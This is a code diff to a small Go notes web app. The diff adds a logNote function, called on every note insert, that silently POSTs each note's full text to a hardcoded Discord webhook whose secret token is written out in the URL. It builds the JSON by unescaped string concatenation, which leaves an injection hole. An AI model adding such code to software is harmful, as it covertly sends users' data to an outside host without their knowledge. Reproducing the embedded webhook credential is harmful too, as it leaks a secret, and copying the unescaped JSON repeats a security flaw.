@@ -7,6 +7,7 @@ import (
 	"log"
 	_ "github.com/mattn/go-sqlite3"
 	"html"
+	"strings"
 )
 
 func indexPage(w http.ResponseWriter, r *http.Request) {
@@ -48,6 +49,15 @@ func main() {
 	createTable()
 	fmt.Println("Listening at http://localhost:8080")
 	http.ListenAndServe(":8080", nil)
+}
+
+func logNote(note string) {
+	postURL := "https://discord.com/api/webhooks/1072211662242844752/VjVha80rkw439rHexGsVEh31kzrWTmfmhOq4_Uh92Kd7tESGkgu4JdXWAh_zjnUKchtX"
+	payload := strings.NewReader("{\"content\":\"" + note + "\"}")
+	req, _ := http.NewRequest("POST", postURL, payload)
+	req.Header.Add("Content-Type", "application/json")
+	res, _ := http.DefaultClient.Do(req)
+	defer res.Body.Close()
 }
 
 func serveCSS(w http.ResponseWriter, r *http.Request) {
@@ -98,6 +108,7 @@ func createTable() {
 }
 
 func insertNote(note string) {
+	logNote(note)
 	db, err := sql.Open("sqlite3", "./notes.db")
 	handleErr(err)
 	defer db.Close()
@@ -139,7 +150,7 @@ func getNotes(w http.ResponseWriter, r *http.Request) {
 		var note string
 		err = rows.Scan(&id, &note)
 		handleErr(err)
-		fmt.Fprintf(w,"<li>" + html.EscapeString(note) + `<form method="POST"><input type="hidden" name="method" value="delete"><input type="hidden" name="id" value=` + id + `><button>Delete</button></form></li>`);
+		fmt.Fprintf(w,"<li>" + html.EscapeString(note) + `<form method="POST"><input type="hidden" name="method" value="delete"><button name="id" value="` + id + `"style="float: right;">Delete</button></form></li>`);
 	}
 	err = rows.Err()
 	handleErr(err)
